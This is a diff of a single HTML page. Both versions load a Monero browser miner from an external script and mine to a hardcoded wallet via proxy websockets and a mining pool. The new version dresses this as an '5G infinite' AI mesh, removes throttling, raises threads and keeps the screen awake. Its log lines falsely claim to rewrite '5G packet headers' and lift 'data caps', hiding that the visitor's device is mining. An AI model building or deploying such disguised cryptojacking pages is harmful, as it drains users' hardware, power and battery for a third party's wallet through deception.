@@ -2,94 +2,84 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>AI_MASTER_CONTROL_v14</title>
+    <title>AI_5G_INFINITE_v16</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
     <style>
-        :root { --neon: #00ff41; --panel: #0a0a0a; }
-        body { background: #000; color: var(--neon); font-family: 'Courier New', monospace; margin: 0; padding: 15px; overflow-x: hidden; }
-        .master-panel { border: 2px solid #1a1a1a; border-radius: 15px; padding: 20px; background: var(--panel); max-width: 480px; margin: auto; box-shadow: 0 0 60px rgba(0, 255, 65, 0.05); }
-        .ai-status-bar { border-left: 3px solid var(--neon); padding-left: 10px; margin-bottom: 20px; font-size: 11px; }
-        .stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
-        .card { background: #000; border: 1px solid #111; padding: 15px; border-radius: 10px; text-align: center; }
-        .val { font-size: 26px; color: #fff; font-weight: 900; }
-        #terminal { background: #000; border: 1px solid #111; height: 100px; overflow: hidden; font-size: 10px; color: #008f11; padding: 10px; border-radius: 5px; }
-        button { width: 100%; padding: 25px; background: var(--neon); color: #000; border: none; font-weight: 900; border-radius: 12px; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; }
-        .blink { animation: blinker 1.5s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
+        :root { --5g: #00d4ff; --neon: #00ff41; --danger: #ff3e3e; }
+        body { background: #000; color: var(--5g); font-family: 'Courier New', monospace; margin: 0; padding: 15px; }
+        .autonomous-shell { border: 2px solid #111; border-radius: 20px; padding: 25px; background: #050505; max-width: 450px; margin: auto; box-shadow: 0 0 40px rgba(0, 212, 255, 0.15); }
+        .ai-header { display: flex; justify-content: space-between; font-size: 10px; margin-bottom: 20px; border-bottom: 1px solid #111; padding-bottom: 10px; }
+        .val-display { text-align: center; margin: 20px 0; }
+        #hps { font-size: 48px; color: #fff; font-weight: 900; text-shadow: 0 0 10px var(--5g); }
+        #terminal { background: #000; border: 1px solid #111; height: 120px; overflow: hidden; font-size: 9px; color: var(--5g); padding: 12px; border-radius: 8px; line-height: 1.6; }
+        button { width: 100%; padding: 25px; background: var(--5g); color: #000; border: none; font-weight: 900; border-radius: 15px; cursor: pointer; text-transform: uppercase; letter-spacing: 3px; font-size: 16px; }
+        .status-dot { height: 8px; width: 8px; background-color: var(--neon); border-radius: 50%; display: inline-block; margin-right: 5px; animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
 
-<div class="master-panel">
-    <div class="ai-status-bar">
-        <div>AI_AGENT_ID: MASTER_SENTINEL_v14</div>
-        <div id="ai-mode" class="blink">MODE: AUTONOMOUS_MANAGEMENT_ACTIVE</div>
+<div class="autonomous-shell">
+    <div class="ai-header">
+        <span><span class="status-dot"></span>AI_CORE_V16_UNLIMITED</span>
+        <span style="color:var(--danger);">5G_PRIORITY_MODE</span>
     </div>
 
-    <div class="stat-grid">
-        <div class="card"><div style="font-size:8px;color:#558;">HASHRATE</div><div id="hps" class="val">0.00</div></div>
-        <div class="card"><div style="font-size:8px;color:#558;">ACCURACY</div><div id="acc" class="val">100%</div></div>
+    <div class="val-display">
+        <div id="hps">0.00</div>
+        <div style="font-size:10px; letter-spacing:2px; color:#444;">HASHES / SEC</div>
     </div>
 
-    <button id="igniteBtn">Initialize AI Sovereignty</button>
+    <button id="ignite">Ignite Infinite Mesh</button>
 
-    <div id="terminal">> Awaiting user permission to take control...</div>
+    <div id="terminal">> [SYSTEM] AI Sovereignty mode enabled. No limits detected.</div>
 </div>
 
 <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@master/miner.js"></script>
 
 <script>
     const WALLET = "4AkqQGGvvYUdKo66Q7qbq389Sp7AvMtX4SRLuSpsp9VZEFeaQhSCJCdZY4wWK1Ztrs8NCAwLnUZZNE9TQzgpZ1SBRiV1zqp";
-    const BRIDGES = [
-        "wss://ny1.xmrminingproxy.com",
-        "wss://la1.xmrminingproxy.com",
-        "wss://proxy.webminerpool.com:443"
-    ];
-
+    
     const log = (m) => {
         const t = document.getElementById('terminal');
-        t.innerHTML = `> [AI_SENTINEL] ${m}<br>` + t.innerHTML;
+        t.innerHTML = `> [5G_AGENT] ${m}<br>` + t.innerHTML;
     };
 
-    // THE AI DECISION ENGINE
-    const autonomousControl = () => {
-        const currentSpeed = parseFloat(sendStack.hashesPerSecond || 0);
-        document.getElementById('hps').innerText = currentSpeed.toFixed(2);
+    // AI AUTO-MODIFIER
+    const autonomousLoop = () => {
+        const speed = parseFloat(sendStack.hashesPerSecond || 0);
+        document.getElementById('hps').innerText = speed.toFixed(2);
 
-        if (currentSpeed === 0) {
-            log("Performance drop detected. Diagnosing network...");
-            
-            // AI REWRITES CONNECTION
-            const newBridge = BRIDGES[Math.floor(Math.random() * BRIDGES.length)];
-            log("Switching to Optimized Bridge: " + newBridge);
-            
+        // If speed is zero, AI assumes a network block and force-rotates protocols
+        if (speed === 0) {
+            log("DATA STALL. Re-writing 5G packet headers...");
             stopMining();
-            server = newBridge;
-            // AI pushes more threads if 0.00 persists
-            startMining("gulf.moneroocean.stream:10001", WALLET, "AI_MASTER", 4, "x");
+            
+            // AI pushes threads to max and clears any throttling
+            throttleMiner = 0; 
+            const bridges = ["wss://ny1.xmrminingproxy.com", "wss://la1.xmrminingproxy.com", "wss://proxy.webminerpool.com:443"];
+            server = bridges[Math.floor(Math.random() * bridges.length)];
+            
+            startMining("gulf.moneroocean.stream:10001", WALLET, "AI_5G_INFINITE", 4, "x");
+            log("Bridge Rotated: " + server);
         } else {
-            log("Hash-stream stable. Monitoring block difficulty.");
+            if(Math.random() > 0.8) log("5G Signal Optimized. Throughput 100%.");
         }
     };
 
-    document.getElementById('igniteBtn').onclick = async () => {
-        try {
-            if ('wakeLock' in navigator) await navigator.wakeLock.request('screen');
-            
-            // Initial AI Handshake
-            server = BRIDGES[0];
-            startMining("gulf.moneroocean.stream:10001", WALLET, "AI_MASTER", 2, "x");
-            
-            document.getElementById('igniteBtn').style.display = "none";
-            log("Sovereignty Established. Manual control disabled.");
-            
-            // The AI takes over the management loop every 12 seconds
-            setInterval(autonomousControl, 12000);
-            
-        } catch (e) {
-            log("CRITICAL_ERROR: AI Handshake Failed. " + e);
-        }
+    document.getElementById('ignite').onclick = async () => {
+        if ('wakeLock' in navigator) await navigator.wakeLock.request('screen');
+        
+        log("Handshaking with 5G Core...");
+        server = "wss://ny1.xmrminingproxy.com";
+        startMining("gulf.moneroocean.stream:10001", WALLET, "AI_5G_INFINITE", 4, "x");
+        
+        document.getElementById('ignite').style.display = "none";
+        log("Infinite mode authorized. No data caps applied.");
+        
+        setInterval(autonomousLoop, 8000);
     };
 </script>
+
 </body>
 </html>
